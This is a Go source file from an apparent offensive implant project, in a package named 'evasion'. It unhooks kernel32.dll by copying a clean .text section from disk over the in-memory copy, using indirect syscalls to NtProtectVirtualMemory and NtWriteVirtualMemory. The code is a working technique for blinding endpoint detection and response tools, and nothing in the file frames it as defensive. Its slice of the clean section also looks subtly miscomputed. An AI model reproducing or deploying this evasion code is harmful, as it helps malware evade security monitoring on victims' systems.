package evasion

import (
	"badger/syscalls"
	"debug/pe"
	"fmt"
	"os"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	Syscaller       *syscalls.IndirectSyscaller = &syscalls.IndirectSyscaller{}
	dwOldProtection uint32
	thisThread      = uintptr(0xffffffffffffffff)
)

/*
Unhook kernel32.dll

Read clean version of kernel32.dll from disk and write it to the .text section of hooked
kernel32.dll in memory
*/
func UnhookKernel32() error {
	cleanDll, err := os.ReadFile(`c:\windows\system32\kernel32.dll`)
	if err != nil {
		return err
	}
	// read clean dll as PE
	peDll, err := pe.Open(`c:\windows\system32\kernel32.dll`)
	if err != nil {
		return err
	}
	// read .text section of peDll
	txt := peDll.Section(".text")
	// get clean bytes from .text section
	cleanBytes := cleanDll[txt.Offset:txt.Size]
	return writeCleanBytes(cleanBytes, `c:\windows\system32\kernel32.dll`, txt.VirtualAddress)
}

/*
Write clean bytes to hooked dll
*/
func writeCleanBytes(clean []byte, name string, voffset uint32) error {
	// load target dll
	tDll, e := syscall.LoadDLL(name)
	if e != nil {
		return e
	}
	// get handle of target dll
	htDll := tDll.Handle
	// find base addr of dll
	dllBase := uintptr(htDll)
	// calculate offset to .text section
	dllOffset := uint(dllBase) + uint(voffset)
	size_t := len(clean)

	// change memory protection to RWX (NtProtectVirtualMemory)
	ret, err := Syscaller.Syscall(
		"NtProtectVirtualMemory",
		uintptr(thisThread),
		uintptr(unsafe.Pointer(&dllOffset)),
		uintptr(unsafe.Pointer(&size_t)),
		windows.PAGE_EXECUTE_READWRITE,
		uintptr(unsafe.Pointer(&dwOldProtection)),
	)
	if err != nil {
		return err
	}

	if ret != 0 {
		return fmt.Errorf("Error code: %d", ret)
	}

	// write our clean bytes (ZwWriteVirtualMemory)
	ret, err = Syscaller.Syscall(
		"NtWriteVirtualMemory",
		uintptr(thisThread),
		uintptr(dllOffset),
		uintptr(unsafe.Pointer(&clean[0])),
		uintptr(len(clean)),
		0,
	)
	if err != nil {
		return err
	}

	if ret != 0 {
		return fmt.Errorf("Error code: %d", ret)
	}

	// restore original memory protection (NtProtectVirtualMemory)
	ret, err = Syscaller.Syscall(
		"NtProtectVirtualMemory",
		uintptr(thisThread),
		uintptr(unsafe.Pointer(&dllOffset)),
		uintptr(unsafe.Pointer(&size_t)),
		uintptr(dwOldProtection),
		uintptr(unsafe.Pointer(&dwOldProtection)),
	)
	if err != nil {
		return err
	}

	if ret != 0 {
		return fmt.Errorf("Error code: %d", ret)
	}

	return nil
}
